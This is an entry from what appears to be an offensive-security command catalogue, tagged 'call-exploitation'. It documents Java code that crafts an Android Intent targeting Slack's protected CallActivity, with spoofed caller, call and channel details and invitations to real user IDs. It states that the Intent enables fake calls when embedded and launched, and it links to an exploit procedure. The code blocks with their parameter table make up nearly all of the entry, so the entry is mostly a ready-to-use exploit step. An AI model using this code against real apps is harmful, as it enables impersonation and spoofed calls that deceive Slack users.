---
id: cmd-create-callactivity-intent
data: >-
  Intent next = new Intent("create");
  next.setClassName("com.Slack","com.Slack.ui.CallActivity");
  next.putExtra("EXTRA_CALL_NAME","Fake call name");
  next.putExtra("EXTRA_CALLER_ID","U1RFBBPCP");
  next.putExtra("EXTRA_CHANNEL_NAME","Fake channel name");
  next.putExtra("EXTRA_CHANNEL_ID","D2B84FUFQ");
  next.putExtra("EXTRA_USERS_TO_INVITE",new ArrayList<String>(Arrays.asList(new
  String[]{"U2B81JBAL"})));
tags:
  - intent-creation
  - call-exploitation
type: command
output: null
executor: java
platforms:
  - Android
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:44.565Z'
verified: false
validated: true
submitted: true
---
# create-callactivity-intent

## Command

```java
Intent next = new Intent("create"); next.setClassName("com.Slack","com.Slack.ui.CallActivity"); next.putExtra("EXTRA_CALL_NAME","Fake call name"); next.putExtra("EXTRA_CALLER_ID","U1RFBBPCP"); next.putExtra("EXTRA_CHANNEL_NAME","Fake channel name"); next.putExtra("EXTRA_CHANNEL_ID","D2B84FUFQ"); next.putExtra("EXTRA_USERS_TO_INVITE",new ArrayList<String>(Arrays.asList(new String[]{"U2B81JBAL"})));
```

## Description

Creates an inner Intent for Slack's CallActivity with spoofed details and real user invites, enabling fake calls when embedded and launched.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| new Intent("create") | Sets action for call creation | Yes |
| setClassName("com.Slack","com.Slack.ui.CallActivity") | Targets protected activity | Yes |
| putExtra("EXTRA_CALL_NAME",...) | Spoofs call name | Yes |
| putExtra("EXTRA_CALLER_ID",...) | Spoofs caller | Yes |
| putExtra("EXTRA_CHANNEL_NAME",...) | Spoofs channel name | Yes |
| putExtra("EXTRA_CHANNEL_ID",...) | Spoofs channel ID | Yes |
| putExtra("EXTRA_USERS_TO_INVITE",...) | Invites real users | Yes |

## Examples

### Basic Usage

```java
Intent next = new Intent("create"); next.setClassName("com.Slack","com.Slack.ui.CallActivity"); next.putExtra("EXTRA_USERS_TO_INVITE", Arrays.asList("U123"));
```

### Advanced Usage

```java
// Full spoofing
Intent next = new Intent("create"); next.setClassName("com.Slack","com.Slack.ui.CallActivity"); next.putExtra("EXTRA_CALL_NAME","Urgent Meeting"); // ... other extras
```

## Expected Output

Intent that, when started, initiates a spoofed call to specified real users.

## Related

- [[commands/embed-intent-in-homeactivity]]
- [[procedures/Exploit-CallActivity-for-Fake-Calls]]
